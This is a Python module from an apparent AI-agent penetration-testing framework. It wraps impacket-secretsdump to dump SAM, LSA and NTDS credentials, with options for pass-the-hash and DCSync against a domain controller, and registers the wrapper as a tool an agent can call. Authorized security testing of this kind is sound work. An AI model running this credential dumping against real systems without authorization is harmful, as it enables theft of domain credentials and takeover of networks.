"""impacket-secretsdump wrapper — SAM/LSA/NTDS credential dumping."""

from __future__ import annotations

from alpha_ai.core.models import ToolCategory, ToolResult
from alpha_ai.core.registry import ToolSpec, registry
from alpha_ai.core.runner import CommandRunner
from alpha_ai.parsers.secretsdump import parse_secretsdump

_runner = CommandRunner()


def _build_identity(target: str, domain: str | None, username: str | None, password: str | None) -> str:
    """Build the impacket target string: [[domain/]user[:password]@]target."""
    if not username:
        return target
    prefix = f"{domain}/" if domain else ""
    creds = f"{username}:{password}" if password is not None else username
    return f"{prefix}{creds}@{target}"


async def secretsdump_scan(
    target: str,
    domain: str | None = None,
    username: str | None = None,
    password: str | None = None,
    hashes: str | None = None,
    dc_ip: str | None = None,
    just_dc: bool = False,
    timeout: float = 600.0,
) -> ToolResult:
    """Dump SAM/LSA/NTDS secrets from *target* with impacket-secretsdump.

    Args:
        target: Host or IP. Must be authorized.
        domain, username, password: Authentication.
        hashes: "LMHASH:NTHASH" for pass-the-hash (in place of password).
        dc_ip: Domain controller IP (-dc-ip), for DCSync against a DC.
        just_dc: Only extract NTDS.dit domain data via DRSUAPI (-just-dc).
    """
    cmd = ["impacket-secretsdump", _build_identity(target, domain, username, password)]
    if hashes:
        cmd += ["-hashes", hashes]
    if just_dc:
        cmd.append("-just-dc")
    if dc_ip:
        cmd += ["-dc-ip", dc_ip]

    cmd_result = await _runner.run(cmd, timeout=timeout)
    findings = parse_secretsdump(cmd_result.stdout, target=target)

    return ToolResult(
        tool="secretsdump",
        target=target,
        args={"domain": domain, "username": username, "just_dc": just_dc, "dc_ip": dc_ip},
        command=cmd_result,
        findings=findings,
    )


registry.register(
    ToolSpec(
        name="secretsdump",
        category=ToolCategory.AD,
        description="Dump SAM/LSA/NTDS credentials (NTLM hashes, DCSync) with impacket-secretsdump.",
        fn=secretsdump_scan,
        parameters={
            "target": {"type": "string", "required": True},
            "domain": {"type": "string"},
            "username": {"type": "string"},
            "password": {"type": "string"},
            "hashes": {"type": "string", "description": "LMHASH:NTHASH for pass-the-hash"},
            "dc_ip": {"type": "string"},
            "just_dc": {"type": "boolean", "default": False},
        },
    )
)
